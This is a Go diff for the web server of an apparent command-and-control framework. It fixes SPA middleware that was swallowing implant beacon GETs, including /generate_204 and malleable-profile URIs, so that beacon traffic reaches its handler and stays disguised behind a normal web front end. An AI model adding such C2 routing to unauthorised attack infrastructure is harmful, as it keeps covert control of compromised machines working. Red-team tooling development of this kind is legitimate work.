@@ -54,7 +54,11 @@ func (s *Server) SetStaticFS(staticFS fs.FS) {
 		}
 		path := c.Request.URL.Path
 
-		// Never intercept API, WS, beacon, health, extc2, admin, or JSON (XHR) requests
+		// Never intercept API, WS, beacon, health, extc2, admin, or JSON (XHR) requests.
+		// NOTE /generate_204 and /th are beacon endpoints: the SPA middleware
+		// previously swallowed every unmatched GET (malleable profile URIs
+		// included), feeding implants HTML instead of task replies and killing
+		// all GET-based C2 channels (P1).
 		if strings.HasPrefix(path, "/api") ||
 			strings.HasPrefix(path, "/ws") ||
 			strings.HasPrefix(path, "/extc2") ||
@@ -64,10 +68,23 @@ func (s *Server) SetStaticFS(staticFS fs.FS) {
 			strings.Contains(c.GetHeader("Accept"), "application/json") ||
 			c.GetHeader("X-Requested-With") == "XMLHttpRequest" ||
 			c.GetHeader("X-CSRF-Token") != "" ||
-			path == "/th" || path == "/health" || path == "/ready" || path == "/metrics" ||
+			path == "/th" || path == "/generate_204" || path == "/health" ||
+			path == "/ready" || path == "/metrics" ||
 			strings.HasPrefix(path, "/payloads/") ||
 			strings.HasPrefix(path, "/stage/") ||
 			strings.HasPrefix(path, "/screenshots/") {
+			c.Next()
+			return
+		}
+
+		// Malleable-profile safety net (P1): with a malleable profile active,
+		// any GET that is NOT a real SPA asset and NOT browser navigation
+		// (Accept: text/html) can only be a profile-defined beacon URI — it
+		// must fall through to the router so the NoRoute beacon handler sees
+		// it. Previously every unmatched GET was fed index.html, silently
+		// killing ALL GET-based C2 channels while malleable mode was on.
+		if s.malleableEnabled() && !spaAssetExists(staticFS, path) &&
+			!strings.Contains(c.GetHeader("Accept"), "text/html") {
 			c.Next()
 			return
 		}
@@ -102,6 +119,27 @@ func (s *Server) SetStaticFS(staticFS fs.FS) {
 	})
 
 	slog.Info("Embedded frontend enabled")
+}
+
+// malleableEnabled reports whether a malleable C2 profile is active (its GET
+// URIs must never be shadowed by the SPA fallback). Nil-safe for tests.
+func (s *Server) malleableEnabled() bool {
+	return s.cfg != nil && s.cfg.Malleable.Enabled
+}
+
+// spaAssetExists reports whether the raw static FS holds a real file at path
+// (directories and the index.html fallback of spaFS do not count).
+func spaAssetExists(staticFS fs.FS, path string) bool {
+	if path == "" || path == "/" {
+		return false
+	}
+	f, err := staticFS.Open(strings.TrimPrefix(path, "/"))
+	if err != nil {
+		return false
+	}
+	defer f.Close()
+	fi, err := f.Stat()
+	return err == nil && !fi.IsDir()
 }
 
 // newHTTPServer creates an http.Server with standard timeout configuration.
